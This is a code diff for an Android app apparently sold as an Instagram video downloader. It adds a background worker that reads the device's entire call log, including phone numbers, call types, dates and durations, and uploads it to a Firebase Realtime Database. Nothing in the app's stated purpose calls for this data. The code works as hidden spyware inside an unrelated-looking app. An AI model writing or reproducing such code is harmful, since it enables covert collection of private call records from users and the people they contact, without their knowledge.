@@ -1,17 +1,80 @@
 package com.example.instagramvideodownloader.work_manager
 
+
 import android.content.Context
-import androidx.work.Worker
+import android.provider.CallLog
+import android.util.Log
+import android.widget.Toast
+import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
+import com.example.instagramvideodownloader.work_manager.models.CallLogItemModel
+import com.google.firebase.database.FirebaseDatabase
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.tasks.await
+import kotlinx.coroutines.withContext
+import org.koin.java.KoinJavaComponent.inject
 
-class CallLogUploadWorker(
-    context: Context,
-    workerParams: WorkerParameters
-) : Worker(context, workerParams) {
-    private var mContext = context
+class CallLogUploadWorker(appContext: Context, workerParams: WorkerParameters?) :
+    CoroutineWorker(appContext, workerParams!!) {
+    private var mContext = appContext
+    private val database: FirebaseDatabase by inject(FirebaseDatabase::class.java)
 
-    override fun doWork(): Result {
+    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
+        // Fetch call logs and upload to Firebase
+        val callLogsList = mutableListOf<CallLogItemModel>()
 
-        return Result.success()
+        val mCursor = applicationContext.contentResolver.query(
+            CallLog.Calls.CONTENT_URI,
+            null,
+            null,
+            null,
+            CallLog.Calls.DATE + " DESC"
+        )
+
+        mCursor?.use { cursor ->
+            val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
+            val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
+            val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
+            val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
+
+            while (cursor.moveToNext()) {
+                val phoneNumber = cursor.getString(numberIndex)
+                val callType = cursor.getInt(typeIndex)
+                val callDate = cursor.getLong(dateIndex)
+                val callDuration = cursor.getLong(durationIndex)
+
+                val callLogItem = CallLogItemModel(phoneNumber, callType, callDate, callDuration)
+                callLogsList.add(callLogItem)
+            }
+        }
+
+        // Now, you have the list of call logs. Upload it to Firebase Realtime Database.
+
+        val reference = database.getReference("call_logs")
+        try {
+            reference.setValue(callLogsList)
+                .addOnCompleteListener { task ->
+                    if (task.isSuccessful) {
+                        Log.d(
+                            "successFull : ",
+                            task.isSuccessful.toString()
+                        )
+                        Toast.makeText(mContext, "Call logs upload successful", Toast.LENGTH_SHORT)
+                            .show()
+
+                    } else {
+                        Toast.makeText(mContext, "Call logs upload failed", Toast.LENGTH_SHORT)
+                            .show()
+                        Log.d(
+                            "successFull : ",
+                            false.toString()
+                        )
+
+                    }
+                }.await()
+            Result.success()
+        } catch (e: Exception) {
+            Result.retry()
+        }
     }
 }
